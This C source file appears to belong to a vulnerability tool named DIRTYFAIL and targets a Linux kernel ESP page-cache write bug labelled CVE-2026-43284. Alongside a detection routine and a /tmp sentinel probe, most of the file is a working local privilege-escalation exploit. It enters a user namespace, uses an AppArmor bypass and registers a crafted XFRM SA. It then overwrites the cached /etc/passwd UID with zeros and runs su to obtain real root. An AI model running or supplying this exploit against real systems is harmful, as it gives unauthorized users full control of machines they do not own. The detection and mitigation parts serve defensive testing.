/*
 * DIRTYFAIL — dirtyfrag_esp.c — Dirty Frag xfrm-ESP variant
 *                                CVE-2026-43284
 *
 * BACKGROUND
 * ----------
 * In Linux, esp_input() runs the AEAD decryption in-place on the
 * incoming skb. Before that, an skb whose payload sits in a frag (i.e.
 * not in the linear head — the case that arises when userspace plants
 * a page via splice()) is supposed to be cloned out into kernel-owned
 * memory by skb_cow_data(). The bug:
 *
 *     if (!skb_cloned(skb)) {
 *         if (!skb_is_nonlinear(skb)) {
 *             nfrags = 1;
 *             goto skip_cow;
 *         } else if (!skb_has_frag_list(skb)) {
 *             nfrags = skb_shinfo(skb)->nr_frags;
 *             nfrags++;
 *             goto skip_cow;          // <-- vulnerable branch
 *         }
 *     }
 *
 * If the skb has frags but no frag_list, esp_input skips the COW and
 * runs in-place AEAD on the user-supplied page. The same authencesn
 * scratch-write that powers Copy Fail then lands at file offset
 * (assoclen + cryptlen) inside that page. The 4 STOREd bytes are
 * `seq_hi` from the SA's replay_esn state, which userspace controls
 * via XFRMA_REPLAY_ESN_VAL on SA registration.
 *
 * Net result: same 4-byte arbitrary-offset write into a page-cache
 * page as Copy Fail, but reachable via the xfrm path *even when
 * algif_aead is blacklisted as a Copy Fail mitigation*.
 *
 * COST: registering an XFRM SA needs CAP_NET_ADMIN, so the attacker
 * must enter a fresh user namespace first. This is allowed by default
 * on most distros except hardened Ubuntu (AppArmor restrict_unprivileged_userns).
 *
 * DETECTION STRATEGY
 * ------------------
 * Precondition-based: we report VULNERABLE when *all* of these hold:
 *   - kernel >= 4.10 (commit cac2661c53f3, 2017-01-17) and not patched
 *   - esp4 module loadable (we don't insmod; rely on autoload)
 *   - unprivileged user namespace creation works
 *
 * Avoiding the actual primitive in detect mode keeps the system
 * undisturbed (no namespaces created in the parent, no encap sockets,
 * no transient SAs). The exploit path runs the full primitive for real.
 *
 * EXPLOIT STRATEGY
 * ----------------
 * Same UID-flip as Copy Fail, but driven through xfrm:
 *
 *   1.  fork() — parent stays in init userns to call su afterwards
 *   2.  child: unshare(CLONE_NEWUSER | CLONE_NEWNET)
 *   3.  child: write deny → /proc/self/setgroups
 *   4.  child: write "0 <real_uid> 1" → /proc/self/uid_map (and gid_map)
 *   5.  child: ioctl SIOCSIFFLAGS to bring lo UP
 *   6.  child: open NETLINK_XFRM, register SA with:
 *               proto=ESP, mode=TRANSPORT, flags=XFRM_STATE_ESN,
 *               alg=authencesn(hmac(sha256),cbc(aes)) (zero keys),
 *               encap=ESPINUDP sport=dport=4500,
 *               replay_esn.seq_hi = "0000"   (the 4 bytes that will land)
 *   7.  child: open udp_recv @ 127.0.0.1:4500 with UDP_ENCAP_ESPINUDP
 *              and udp_send connected to 127.0.0.1:4500
 *   8.  child: pipe(); vmsplice forged ESP wire header (24 bytes) →
 *              splice /etc/passwd at uid_off, len 16 → splice pipe → udp_send
 *   9.  child: recvmsg drives the kernel through the esp_input path,
 *              firing the 4-byte STORE of "0000" into /etc/passwd
 *              at the user's UID offset
 *  10.  child: exits, parent verifies via fresh open of /etc/passwd
 *  11.  parent: execlp("su", username) — PAM checks /etc/shadow on
 *              disk (untouched), gets right password, setuid(0) lands
 *              us at root because the page-cache copy of /etc/passwd
 *              now lists us as UID 0.
 */

#include "dirtyfrag_esp.h"
#include "apparmor_bypass.h"

#include <fcntl.h>
#include <pwd.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/uio.h>

#ifdef __linux__
#include <sys/syscall.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#endif

/* UDP_ENCAP / UDP_ENCAP_ESPINUDP live in <linux/udp.h>, but that header
 * conflicts with <netinet/udp.h> over `struct udphdr` and we don't
 * actually need the struct. The kernel constants are stable, so we
 * just hard-code them as fallbacks (the #ifndef makes this a no-op if
 * the toolchain happens to expose them already). */
#ifndef UDP_ENCAP
#define UDP_ENCAP             100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP      2
#endif
#ifndef IPPROTO_ESP
#define IPPROTO_ESP            50
#endif

#ifndef __linux__
#define CLONE_NEWUSER 0x10000000
#define CLONE_NEWNET  0x40000000
#define IFF_UP               0x01
#define IFF_RUNNING          0x40
#define SIOCSIFFLAGS     0x8914
struct sockaddr_in { int dummy; };
struct ifreq      { int dummy; };
__attribute__((unused))
static ssize_t splice (int a, void *b, int c, void *d, size_t e, unsigned f)
{ (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; errno=ENOSYS; return -1; }
__attribute__((unused))
static ssize_t vmsplice(int a, const struct iovec *b, unsigned long c, unsigned d)
{ (void)a;(void)b;(void)c;(void)d; errno=ENOSYS; return -1; }
__attribute__((unused))
static int     ioctl  (int a, unsigned long b, ...)
{ (void)a;(void)b; errno=ENOSYS; return -1; }
#else
extern ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out,
                      size_t len, unsigned int flags);
extern ssize_t vmsplice(int fd, const struct iovec *iov, unsigned long nr,
                        unsigned int flags);
#endif

#define ENCAP_PORT 4500
#define ESP_SPI    0xDEADBE10
#define MARKER     "0000"
#define ALG_NAME   "authencesn(hmac(sha256),cbc(aes))"

/* ---------------------------------------------------------------- *
 * Detection
 * ---------------------------------------------------------------- */

df_result_t dirtyfrag_esp_detect(void)
{
    log_step("Dirty Frag — xfrm-ESP variant (CVE-2026-43284) — detection");

    int km = -1, kn = -1;
    if (kernel_version(&km, &kn))
        log_hint("kernel %d.%d.x", km, kn);

    /* The vulnerable branch was introduced in 2017 (cac2661c53f3) and
     * the upstream fix is f4c50a4034e6 (2026-05-07). We can't easily
     * tell whether a particular distro kernel has the backport, so we
     * report based on prereq presence and let the operator decide. */

    /* esp4 / esp6 modules. They autoload on first XFRM SA registration,
     * but we want to know if the build supports them at all. /proc/modules
     * lists currently-loaded; that's a strong positive signal. */
    bool esp4 = kmod_loaded("esp4");
    bool esp6 = kmod_loaded("esp6");
    log_hint("esp4 currently loaded: %s", esp4 ? "yes" : "no");
    log_hint("esp6 currently loaded: %s", esp6 ? "yes" : "no");

    bool userns = unprivileged_userns_allowed();
    log_hint("unprivileged user namespace: %s", userns ? "allowed" : "DENIED");

    if (!userns) {
        log_ok("xfrm-ESP variant unreachable without unprivileged userns");
        log_hint("on Ubuntu, this is the expected hardening — but the RxRPC "
                 "variant of Dirty Frag may still be reachable. Run with "
                 "--check-rxrpc.");
        return DF_PRECOND_FAIL;
    }

    if (!esp4 && !esp6) {
        log_hint("no esp4/esp6 currently loaded; the kernel will autoload them "
                 "on first SA registration. We treat this as still vulnerable.");
    }

    /* On hardened distros (Ubuntu 26.04+) caps are stripped inside the
     * userns even after our bypass — kernel may still have the bug but
     * unprivileged users can't reach it. Report that honestly rather
     * than claiming VULNERABLE. */
    if (apparmor_userns_caps_blocked()) {
        log_ok("LSM-mitigated — kernel may still have the bug but the AppArmor "
               "policy denies CAP_NET_ADMIN inside any unprivileged userns.");
        log_hint("unprivileged exploitation is blocked; real root can still "
                 "reach the kernel bug. Apply the kernel patch as soon as your "
                 "distro ships it.");
        return DF_PRECOND_FAIL;
    }

    if (dirtyfail_active_probes) {
        log_step("--active set: firing v4 ESP-in-UDP trigger against /tmp sentinel");
        df_result_t pr = dirtyfrag_esp_active_probe();
        if (pr == DF_VULNERABLE || pr == DF_OK || pr == DF_PRECOND_FAIL) return pr;
        log_warn("active probe inconclusive — falling back to precondition verdict");
    }

    log_warn("VULNERABLE (preconditions met) — userns + xfrm SA registration "
             "available, kernel within affected window");
    log_warn("apply mainline patch f4c50a4034e6 or your distro's backport");
    log_warn("interim mitigation: `dirtyfail --mitigate` or manually blacklist "
             "esp4/esp6 in /etc/modprobe.d/");
    log_hint("re-run with `--scan --active` for an empirical sentinel-STORE probe");
    return DF_VULNERABLE;
}

/* ---------------------------------------------------------------- *
 * Exploit — only compiled with full bodies on Linux.
 * ---------------------------------------------------------------- */

#ifdef __linux__

/* Write a small string to a /proc file. */
static bool write_proc(const char *path, const char *value)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return false;
    ssize_t want = strlen(value);
    ssize_t got  = write(fd, value, want);
    close(fd);
    return got == want;
}

/* ---- Netlink XFRM SA registration --------------------------------- *
 *
 * The XFRM SA registration is built by hand. Each attribute is a 4-byte
 * aligned struct rtattr { u16 rta_len; u16 rta_type; } followed by
 * payload. The total nlmsg length is filled in last.
 *
 * Register an XFRM_MSG_NEWSA carrying our marker in replay_esn.seq_hi.
 */
static bool xfrm_register_sa(int nl, const unsigned char seq_hi[4])
{
    char buf[2048] = {0};
    struct nlmsghdr  *nlh = (struct nlmsghdr  *)buf;
    struct xfrm_usersa_info *usa =
        (struct xfrm_usersa_info *)NLMSG_DATA(nlh);

    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq   = 1;

    /* Selector: src/dst 127.0.0.1, IPv4 */
    usa->sel.daddr.a4 = htonl(0x7f000001);
    usa->sel.saddr.a4 = htonl(0x7f000001);
    usa->sel.family   = AF_INET;
    usa->sel.prefixlen_d = 32;
    usa->sel.prefixlen_s = 32;

    usa->id.daddr.a4  = htonl(0x7f000001);
    usa->id.spi       = htonl(ESP_SPI);
    usa->id.proto     = IPPROTO_ESP;

    usa->saddr.a4     = htonl(0x7f000001);

    usa->lft.soft_byte_limit   = (uint64_t)-1;
    usa->lft.hard_byte_limit   = (uint64_t)-1;
    usa->lft.soft_packet_limit = (uint64_t)-1;
    usa->lft.hard_packet_limit = (uint64_t)-1;

    usa->reqid     = 0x1234;
    usa->family    = AF_INET;
    usa->mode      = XFRM_MODE_TRANSPORT;
    usa->replay_window = 0;       /* SA-level: 0; ESN-level (below): 32 */
    usa->flags     = XFRM_STATE_ESN;

    size_t hdrlen = sizeof(*nlh) + sizeof(*usa);
    size_t attrs  = 0;
    char   *abuf  = buf + hdrlen;

    /*
     * The kernel's xfrm code does NOT accept `authencesn(...)` as a
     * single XFRMA_ALG_AEAD attribute — it's a composition that has
     * to be assembled from separate auth + crypt parts. We register:
     *   XFRMA_ALG_AUTH_TRUNC : hmac(sha256) with 32-byte key, 128-bit ICV
     *   XFRMA_ALG_CRYPT      : cbc(aes)     with 16-byte key
     *
     * The kernel internally wires these into authencesn(hmac(sha256),
     * cbc(aes)) when it sees XFRM_STATE_ESN on the SA.
     */
    {  /* XFRMA_ALG_AUTH_TRUNC */
        struct xfrm_algo_auth *aa;
        unsigned short dlen = sizeof(*aa) + 32;   /* HMAC-SHA256 key */
        struct rtattr *r = (struct rtattr *)(abuf + attrs);
        r->rta_type = XFRMA_ALG_AUTH_TRUNC;
        r->rta_len  = RTA_LENGTH(dlen);
        aa = (struct xfrm_algo_auth *)RTA_DATA(r);
        memset(aa, 0, dlen);
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
        aa->alg_key_len   = 32 * 8;   /* bits */
        aa->alg_trunc_len = 128;      /* bits — truncated MAC width */
        attrs += RTA_SPACE(dlen);
    }
    {  /* XFRMA_ALG_CRYPT */
        struct xfrm_algo *ea;
        unsigned short dlen = sizeof(*ea) + 16;   /* AES-128 key */
        struct rtattr *r = (struct rtattr *)(abuf + attrs);
        r->rta_type = XFRMA_ALG_CRYPT;
        r->rta_len  = RTA_LENGTH(dlen);
        ea = (struct xfrm_algo *)RTA_DATA(r);
        memset(ea, 0, dlen);
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
        ea->alg_key_len = 16 * 8;
        attrs += RTA_SPACE(dlen);
    }

    /* XFRMA_REPLAY_ESN_VAL — this is where seq_hi rides */
    {
        struct xfrm_replay_state_esn *esn;
        unsigned short dlen = sizeof(*esn) + 4;  /* bmp_len * 4 = 4 */
        struct rtattr *r = (struct rtattr *)(abuf + attrs);
        r->rta_type = XFRMA_REPLAY_ESN_VAL;
        r->rta_len  = RTA_LENGTH(dlen);
        esn = (struct xfrm_replay_state_esn *)RTA_DATA(r);
        memset(esn, 0, dlen);
        esn->bmp_len       = 1;
        esn->oseq          = 0;
        esn->seq           = 100;
        esn->oseq_hi       = 0;
        memcpy(&esn->seq_hi, seq_hi, 4);  /* THE PRIMITIVE INPUT */
        esn->replay_window = 32;
        attrs += RTA_SPACE(dlen);
    }

    /* XFRMA_ENCAP — UDP encapsulation, sport=dport=4500 */
    {
        struct xfrm_encap_tmpl *enc;
        unsigned short dlen = sizeof(*enc);
        struct rtattr *r = (struct rtattr *)(abuf + attrs);
        r->rta_type = XFRMA_ENCAP;
        r->rta_len  = RTA_LENGTH(dlen);
        enc = (struct xfrm_encap_tmpl *)RTA_DATA(r);
        memset(enc, 0, dlen);
        enc->encap_type  = UDP_ENCAP_ESPINUDP;
        enc->encap_sport = htons(ENCAP_PORT);
        enc->encap_dport = htons(ENCAP_PORT);
        enc->encap_oa.a4 = 0;
        attrs += RTA_SPACE(dlen);
    }

    nlh->nlmsg_len = hdrlen + attrs;

    struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
    if (sendto(nl, buf, nlh->nlmsg_len, 0,
               (struct sockaddr *)&nladdr, sizeof(nladdr)) < 0)
        return false;

    /* Drain ACK */
    char ack[4096];
    ssize_t n = recv(nl, ack, sizeof(ack), 0);
    if (n < (ssize_t)sizeof(struct nlmsghdr)) return false;
    struct nlmsghdr *r = (struct nlmsghdr *)ack;
    if (r->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(r);
        if (e->error != 0) {
            log_bad("XFRM_MSG_NEWSA: %s", strerror(-e->error));
            return false;
        }
    }
    return true;
}

/* Bring loopback up inside the new netns. */
static bool bring_lo_up(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return false;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
    ifr.ifr_flags = IFF_UP | IFF_RUNNING;
    int rc = ioctl(s, SIOCSIFFLAGS, &ifr);
    close(s);
    return rc == 0;
}

/* Trigger esp_input by sending a forged ESP-in-UDP packet whose payload
 * is a page-cache page from `target_path`, planted via splice at
 * `splice_off`. The kernel STORE lands ~14 bytes into the spliced
 * region (the v4 path has no V6_STORE_SHIFT-style offset). */
static bool trigger_store_at(const char *target_path, loff_t splice_off)
{
    /* udp_recv: bound to 127.0.0.1:4500 with UDP_ENCAP_ESPINUDP set so
     * incoming UDP frames are rerouted into xfrm_input -> esp_input. */
    int udp_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_recv < 0) return false;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port   = htons(ENCAP_PORT),
        .sin_addr.s_addr = htonl(0x7f000001),
    };
    int reuse = 1;
    setsockopt(udp_recv, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    if (bind(udp_recv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        log_bad("bind udp_recv: %s", strerror(errno));
        close(udp_recv); return false;
    }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(udp_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        log_bad("UDP_ENCAP_ESPINUDP: %s", strerror(errno));
        close(udp_recv); return false;
    }

    /* udp_send: connect to udp_recv. Packets we splice here will arrive
     * at udp_recv via loopback and feed xfrm_input. */
    int udp_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_send < 0) { close(udp_recv); return false; }
    if (connect(udp_send, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        log_bad("connect udp_send: %s", strerror(errno));
        close(udp_recv); close(udp_send); return false;
    }

    /* Build wire ESP header: SPI(4) || seq_no(4) || IV(16) = 24 bytes.
     * IV value doesn't matter — auth check fails after the STORE. */
    unsigned char wire_hdr[24];
    *(uint32_t *)(wire_hdr + 0) = htonl(ESP_SPI);
    *(uint32_t *)(wire_hdr + 4) = htonl(101);  /* seq_no_lo */
    memset(wire_hdr + 8, 0xCC, 16);

    /* Open the target file for splicing. */
    int pfd = open(target_path, O_RDONLY);
    if (pfd < 0) {
        log_bad("open %s: %s", target_path, strerror(errno));
        close(udp_recv); close(udp_send); return false;
    }

    int p[2];
    if (pipe(p) < 0) {
        log_bad("pipe: %s", strerror(errno));
        close(pfd); close(udp_recv); close(udp_send); return false;
    }

    /* vmsplice the wire header into the pipe (24 bytes). */
    struct iovec iov = { .iov_base = wire_hdr, .iov_len = sizeof(wire_hdr) };
    if (vmsplice(p[1], &iov, 1, 0) != (ssize_t)sizeof(wire_hdr)) {
        log_bad("vmsplice header: %s", strerror(errno));
        close(p[0]); close(p[1]); close(pfd);
        close(udp_recv); close(udp_send); return false;
    }
    /* splice 16 bytes of target's page cache from splice_off. */
    loff_t off = splice_off;
    if (splice(pfd, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) {
        log_bad("splice file->pipe: %s", strerror(errno));
        close(p[0]); close(p[1]); close(pfd);
        close(udp_recv); close(udp_send); return false;
    }
    /* splice the whole 40-byte payload from pipe to udp_send. */
    if (splice(p[0], NULL, udp_send, NULL, 24 + 16, SPLICE_F_MOVE) != 40) {
        log_bad("splice pipe->udp: %s", strerror(errno));
        close(p[0]); close(p[1]); close(pfd);
        close(udp_recv); close(udp_send); return false;
    }
    close(p[0]); close(p[1]);

    /* Drive the receive — esp_input runs inline here, performs the
     * scratch-write, and we don't really care about the actual recv
     * data (auth will fail with EBADMSG).
     *
     * The usleep gives the kernel a hard guarantee that the in-place
     * decrypt has finished and the page-cache STORE is visible before
     * we tear down the sockets. On a busy or slow VM, splice() can
     * return before esp_input has actually fired. V4bel's reference
     * exploit uses the same 150ms wait. */
    usleep(150 * 1000);
    unsigned char drain[256];
    (void)recv(udp_recv, drain, sizeof(drain), MSG_DONTWAIT);

    close(pfd);
    close(udp_recv);
    close(udp_send);
    return true;
}

/* Compatibility wrapper for the exploit path: target /etc/passwd. */
static bool trigger_store(off_t passwd_off)
{
    return trigger_store_at("/etc/passwd", passwd_off);
}

__attribute__((unused))
static int run_in_userns(off_t passwd_off, uid_t real_uid, gid_t real_gid)
{
    if (syscall(SYS_unshare, CLONE_NEWUSER | CLONE_NEWNET) != 0) {
        log_bad("unshare: %s", strerror(errno));
        return 1;
    }
    if (!write_proc("/proc/self/setgroups", "deny")) {
        log_bad("setgroups deny: %s", strerror(errno));
        return 1;
    }
    char map[64];
    snprintf(map, sizeof(map), "0 %u 1", (unsigned)real_uid);
    if (!write_proc("/proc/self/uid_map", map)) {
        log_bad("uid_map: %s", strerror(errno));
        return 1;
    }
    snprintf(map, sizeof(map), "0 %u 1", (unsigned)real_gid);
    if (!write_proc("/proc/self/gid_map", map)) {
        log_bad("gid_map: %s", strerror(errno));
        return 1;
    }
    if (!bring_lo_up()) {
        log_bad("bring lo up: %s", strerror(errno));
        return 1;
    }

    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (nl < 0) {
        log_bad("AF_NETLINK XFRM: %s", strerror(errno));
        return 1;
    }
    struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
    if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
        log_bad("bind netlink: %s", strerror(errno));
        close(nl); return 1;
    }

    if (!xfrm_register_sa(nl, (const unsigned char *)MARKER)) {
        close(nl); return 1;
    }
    log_ok("XFRM SA registered with seq_hi='%s'", MARKER);

    if (!trigger_store(passwd_off)) {
        log_bad("trigger failed");
        close(nl); return 1;
    }
    log_ok("ESP-in-UDP trigger fired");

    close(nl);
    return 0;
}

#else  /* __linux__ */
__attribute__((unused))
static int run_in_userns(off_t passwd_off, uid_t real_uid, gid_t real_gid)
{
    (void)passwd_off; (void)real_uid; (void)real_gid;
    return 1;
}
#endif

/* ---------------------------------------------------------------- *
 * INNER — runs in the AA bypass userns (post-stage 2).
 *
 * No user interaction, no fork, no verify, no su. Just the kernel
 * work: open netlink, register SA, fire splice trigger, exit.
 * The parent (init ns) owns everything else.
 * ---------------------------------------------------------------- */

df_result_t dirtyfrag_esp_exploit_inner(void)
{
#ifdef __linux__
    const char *user = getenv("DIRTYFAIL_TARGET_USER");
    if (!user || !*user) {
        log_bad("inner: DIRTYFAIL_TARGET_USER not set");
        return DF_TEST_ERROR;
    }

    off_t  uid_off; size_t uid_len; char uid_str[16];
    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
        log_bad("inner: find_passwd_uid_field('%s') failed", user);
        return DF_TEST_ERROR;
    }
    if (uid_len != 4) {
        log_bad("inner: UID '%s' is %zu chars; need 4", uid_str, uid_len);
        return DF_TEST_ERROR;
    }

    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (nl < 0) {
        log_bad("inner: AF_NETLINK XFRM: %s", strerror(errno));
        return DF_EXPLOIT_FAIL;
    }
    struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
    if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
        log_bad("inner: bind netlink: %s", strerror(errno));
        close(nl);
        return DF_EXPLOIT_FAIL;
    }

    if (!xfrm_register_sa(nl, (const unsigned char *)MARKER)) {
        close(nl);
        return DF_EXPLOIT_FAIL;
    }
    log_ok("inner: XFRM SA registered with seq_hi='%s'", MARKER);

    if (!trigger_store(uid_off)) {
        close(nl);
        return DF_EXPLOIT_FAIL;
    }
    log_ok("inner: ESP-in-UDP trigger fired at uid_off=%lld",
           (long long)uid_off);

    close(nl);
    return DF_EXPLOIT_OK;
#else
    log_bad("dirtyfrag_esp_exploit_inner: Linux-only");
    return DF_TEST_ERROR;
#endif
}

/* ---------------------------------------------------------------- *
 * OUTER — runs in init namespace.
 *
 * Prompts the operator, sets env vars, fork → child arms AA bypass
 * and runs the inner. Parent stays in init ns, waits, reads the
 * global page cache to verify, then either:
 *   - do_shell=true: execlp("su", user) — runs in init ns →
 *     PAM reads modified /etc/passwd → uid 0 → real init-ns root
 *   - do_shell=false: try_revert_passwd_page_cache, return.
 * ---------------------------------------------------------------- */

df_result_t dirtyfrag_esp_exploit(bool do_shell)
{
    log_step("Dirty Frag (xfrm-ESP) — exploit");

    uid_t uid = getuid();
    if (uid == 0) {
        log_warn("already root in init namespace — nothing to escalate");
        return DF_OK;
    }
    struct passwd *pw = getpwuid(uid);
    if (!pw) { log_bad("getpwuid: %s", strerror(errno)); return DF_TEST_ERROR; }
    const char *user = pw->pw_name;

    off_t  uid_off; size_t uid_len; char uid_str[16];
    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
        log_bad("could not find %s in /etc/passwd", user);
        return DF_TEST_ERROR;
    }
    log_step("/etc/passwd UID for %s: '%s' at offset %lld",
             user, uid_str, (long long)uid_off);
    if (uid_len != 4) {
        log_bad("UID '%s' is %zu chars; this technique needs exactly 4",
                uid_str, uid_len);
        return DF_TEST_ERROR;
    }

    log_warn("about to run xfrm-ESP page-cache write against /etc/passwd");
    log_warn("this enters a fresh user/net namespace, registers an XFRM SA, "
             "and sends an ESP-in-UDP packet whose payload is the /etc/passwd "
             "page from offset %lld", (long long)uid_off);
    log_warn("on success the page cache will report '%s' as UID 0", user);
    log_warn("cleanup: dirtyfail --cleanup, or `echo 3 > /proc/sys/vm/drop_caches`");
    if (!typed_confirm("DIRTYFAIL")) {
        log_bad("confirmation declined — aborting");
        return DF_OK;
    }
    if (!ssh_lockout_check(user)) {
        log_bad("SSH-lockout confirmation declined — aborting");
        return DF_OK;
    }

    /* Hand off to the inner via env vars + AA bypass fork.
     *
     * The child fork enters the bypass userns, runs
     * dirtyfrag_esp_exploit_inner (dispatched from main() based on
     * DIRTYFAIL_INNER_MODE), modifies the global page cache, exits.
     * We (parent, init ns) read the result via the same global page
     * cache and execlp(su) here in init ns for REAL root. */
    setenv("DIRTYFAIL_INNER_MODE",   "esp", 1);
    setenv("DIRTYFAIL_TARGET_USER",  user,  1);

    int rc = apparmor_bypass_fork_arm(0, NULL);  /* argc/argv unused for forked variant */
    if (rc != DF_EXPLOIT_OK) {
        log_bad("inner exploit failed (exit=%d)", rc);
        return DF_EXPLOIT_FAIL;
    }

    /* Verify in init namespace — page cache is global, so we see the
     * child's modification here. */
    int v = open("/etc/passwd", O_RDONLY);
    if (v < 0) { log_bad("verify open: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
    if (lseek(v, uid_off, SEEK_SET) != uid_off) { close(v); return DF_EXPLOIT_FAIL; }
    char land[5] = {0};
    if (read(v, land, 4) != 4) { close(v); return DF_EXPLOIT_FAIL; }
    close(v);
    if (memcmp(land, MARKER, 4) != 0) {
        log_bad("write did not land — page cache reads '%.4s'", land);
        return DF_EXPLOIT_FAIL;
    }
    log_ok("page cache now reports %s with uid 0", user);

    if (!do_shell) {
        if (try_revert_passwd_page_cache())
            log_ok("page cache reverted (--no-shell)");
        else
            log_warn("page cache may still be modified — `sudo dirtyfail --cleanup` or reboot");
        return DF_EXPLOIT_OK;
    }

    log_ok("invoking 'su %s' in init namespace — enter your password for REAL root", user);
    execlp("su", "su", user, (char *)NULL);
    log_bad("execlp: %s", strerror(errno));
    return DF_EXPLOIT_FAIL;
}

/* ---------------------------------------------------------------- *
 * Active probe — used by `--scan --active`.
 *
 * Same userns + XFRM SA + splice-trigger setup as the exploit, but
 * targets a sentinel file in /tmp instead of /etc/passwd. The parent
 * (init ns) reads the sentinel after the child returns and looks for
 * the marker bytes.
 *
 * If the marker landed → kernel STORE is reachable → DF_VULNERABLE.
 * If the page is intact → kernel is patched → DF_OK.
 * If AA blocks the bypass → DF_PRECOND_FAIL.
 * ---------------------------------------------------------------- */

df_result_t dirtyfrag_esp_active_probe_inner(void)
{
#ifdef __linux__
    const char *sentinel = getenv("DIRTYFAIL_PROBE_SENTINEL");
    if (!sentinel || !*sentinel) {
        log_bad("active-probe: DIRTYFAIL_PROBE_SENTINEL not set");
        return DF_TEST_ERROR;
    }

    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (nl < 0) {
        log_bad("active-probe: netlink xfrm: %s", strerror(errno));
        return DF_TEST_ERROR;
    }
    struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
    if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
        log_bad("active-probe: bind netlink: %s", strerror(errno));
        close(nl); return DF_TEST_ERROR;
    }
    if (!bring_lo_up()) {
        log_bad("active-probe: bring lo up: %s", strerror(errno));
        close(nl); return DF_TEST_ERROR;
    }
    if (!xfrm_register_sa(nl, (const unsigned char *)MARKER)) {
        close(nl); return DF_TEST_ERROR;
    }
    if (!trigger_store_at(sentinel, 0)) {
        close(nl); return DF_TEST_ERROR;
    }
    close(nl);
    return DF_EXPLOIT_OK;
#else
    return DF_TEST_ERROR;
#endif
}

df_result_t dirtyfrag_esp_active_probe(void)
{
    /* Sentinel file: 4 KiB of 'A' bytes. */
    char tmpl[] = "/tmp/dirtyfail-esp-probe.XXXXXX";
    int sfd = mkstemp(tmpl);
    if (sfd < 0) { log_bad("probe mkstemp: %s", strerror(errno)); return DF_TEST_ERROR; }
    unsigned char filler[4096];
    memset(filler, 'A', sizeof(filler));
    if (write(sfd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
        close(sfd); unlink(tmpl); return DF_TEST_ERROR;
    }
    close(sfd);

    /* Fault the page in. */
    int rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
    char tmp[4096];
    if (read(rfd, tmp, sizeof(tmp)) != (ssize_t)sizeof(tmp)) {
        close(rfd); unlink(tmpl); return DF_TEST_ERROR;
    }
    close(rfd);

    setenv("DIRTYFAIL_INNER_MODE",      "esp-probe", 1);
    setenv("DIRTYFAIL_PROBE_SENTINEL",  tmpl,        1);
    int rc = apparmor_bypass_fork_arm(0, NULL);
    unsetenv("DIRTYFAIL_INNER_MODE");
    unsetenv("DIRTYFAIL_PROBE_SENTINEL");

    if (rc == DF_PRECOND_FAIL) { unlink(tmpl); return DF_PRECOND_FAIL; }
    if (rc != DF_EXPLOIT_OK)   {
        log_bad("active-probe inner failed (exit=%d)", rc);
        unlink(tmpl); return DF_TEST_ERROR;
    }

    /* Re-read sentinel and search for marker. */
    rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
    unsigned char after[64];
    ssize_t got = read(rfd, after, sizeof(after));
    close(rfd);
    unlink(tmpl);
    if (got <= 0) return DF_TEST_ERROR;

    for (int i = 0; i + 4 <= got; i++) {
        if (memcmp(after + i, MARKER, 4) == 0) {
            log_warn("ACTIVE PROBE: STORE landed at offset %d → kernel is VULNERABLE", i);
            return DF_VULNERABLE;
        }
    }
    log_ok("ACTIVE PROBE: page intact — kernel ESP path appears patched");
    return DF_OK;
}
